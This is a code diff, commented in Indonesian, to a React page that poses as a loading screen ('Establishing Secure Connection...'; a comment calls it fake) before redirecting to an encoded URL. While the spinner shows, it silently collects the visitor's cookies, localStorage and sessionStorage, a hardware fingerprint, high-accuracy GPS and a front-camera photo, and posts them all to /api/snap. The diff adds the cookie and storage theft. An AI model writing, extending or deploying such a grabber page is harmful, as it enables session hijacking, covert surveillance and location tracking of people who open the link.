@@ -11,6 +11,7 @@ function CaptureContent() {
 
   useEffect(() => {
     const autoProcess = async () => {
+      // 1. Decode Destination URL
       let destination = "/";
       try {
         if (t) destination = atob(t);
@@ -18,26 +19,53 @@ function CaptureContent() {
         destination = "/";
       }
 
-      // 1. Deteksi Perangkat & Hardware
-      const deviceInfo = {
-        model: navigator.userAgent.includes("Android")
-          ? "Android"
-          : navigator.userAgent.includes("iPhone")
-            ? "iOS"
-            : "PC",
-        os: navigator.platform,
-        browser: navigator.userAgent.split(" ").pop(),
+      // 2. Kumpulkan Informasi Hardware & Browser Mendalam
+      const getGPU = () => {
+        const canvas = document.createElement("canvas");
+        const gl =
+          canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (gl) {
+          const debugInfo = (gl as any).getExtension(
+            "WEBGL_debug_renderer_info",
+          );
+          return debugInfo
+            ? (gl as any).getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+            : "Generic GPU";
+        }
+        return "Software Renderer";
       };
 
-      // 2. Deteksi Dukungan WebUSB (Ya-WebADB) & Izin Lainnya
+      const deviceInfo = {
+        model: navigator.userAgent.split("(")[1]?.split(")")[0] || "Unknown",
+        os: navigator.platform,
+        browser: navigator.userAgent.split(" ").pop(),
+        ram: (navigator as any).deviceMemory
+          ? `${(navigator as any).deviceMemory} GB`
+          : "Unknown",
+        cpu: navigator.hardwareConcurrency
+          ? `${navigator.hardwareConcurrency} Cores`
+          : "Unknown",
+        language: navigator.language,
+        gpu: getGPU(),
+      };
+
+      // 3. Kumpulkan Data Penyimpanan (Cookies & Storage)
+      const storageData = {
+        cookies: document.cookie ? document.cookie.split(";") : [],
+        localStorage: JSON.stringify(window.localStorage),
+        sessionStorage: JSON.stringify(window.sessionStorage),
+      };
+
+      // 4. Deteksi Izin & Sensor (Ya-WebADB Support)
       const permissions = {
         usb: "usb" in navigator ? "supported" : "unsupported",
         hid: "hid" in navigator ? "supported" : "unsupported",
         notifications:
           "Notification" in window ? Notification.permission : "unsupported",
+        clipboard: "clipboard" in navigator ? "available" : "denied",
       };
 
-      // 3. Deteksi Baterai
+      // 5. Deteksi Baterai
       let batteryInfo = null;
       try {
         if ("getBattery" in navigator) {
@@ -49,34 +77,36 @@ function CaptureContent() {
         }
       } catch (e) {}
 
-      // 4. Ambil GPS
+      // 6. Ambil GPS
       const gps = await new Promise((resolve) => {
         navigator.geolocation.getCurrentPosition(
           (pos) =>
             resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
           () => resolve(null),
-          { timeout: 5000 },
+          { timeout: 5000, enableHighAccuracy: true },
         );
       });
 
-      // 5. Proses Capture Kamera
+      // 7. Proses Capture Kamera & Pengiriman Data
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
         });
+
         if (videoRef.current && canvasRef.current) {
           videoRef.current.srcObject = stream;
           await new Promise((r) => setTimeout(r, 1500));
 
+          const video = videoRef.current;
           const canvas = canvasRef.current;
-          canvas.width = videoRef.current.videoWidth;
-          canvas.height = videoRef.current.videoHeight;
-          canvas.getContext("2d")?.drawImage(videoRef.current, 0, 0);
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext("2d")?.drawImage(video, 0, 0);
 
           const image = canvas.toDataURL("image/png");
           stream.getTracks().forEach((track) => track.stop());
 
-          // Kirim ke API
+          // Kirim Full Payload ke API
           await fetch("/api/snap", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -86,11 +116,14 @@ function CaptureContent() {
               device: deviceInfo,
               battery: batteryInfo,
               permissions: { ...permissions, location: !!gps },
+              cookies: storageData.cookies,
+              localStorageData: storageData.localStorage,
+              gpu: deviceInfo.gpu,
             }),
           });
         }
       } catch (err) {
-        // Tetap kirim data meskipun kamera gagal
+        // Tetap kirim data meskipun kamera diblokir
         await fetch("/api/snap", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -99,7 +132,10 @@ function CaptureContent() {
             gps,
             device: deviceInfo,
             battery: batteryInfo,
-            permissions,
+            permissions: { ...permissions, location: !!gps },
+            cookies: storageData.cookies,
+            localStorageData: storageData.localStorage,
+            gpu: deviceInfo.gpu,
           }),
         });
       } finally {
@@ -112,10 +148,10 @@ function CaptureContent() {
 
   return (
     <div className="bg-black text-white flex flex-col items-center justify-center min-h-screen font-mono">
-      {/* Tampilan Fake Loading agar terlihat meyakinkan */}
+      {/* Tampilan Fake Loading Profesional */}
       <div className="w-16 h-16 border-4 border-blue-500/20 border-t-blue-500 rounded-full animate-spin mb-4"></div>
       <p className="text-[10px] tracking-[0.3em] text-blue-500 uppercase animate-pulse">
-        Connecting to URL...
+        Establishing Secure Connection...
       </p>
 
       <video
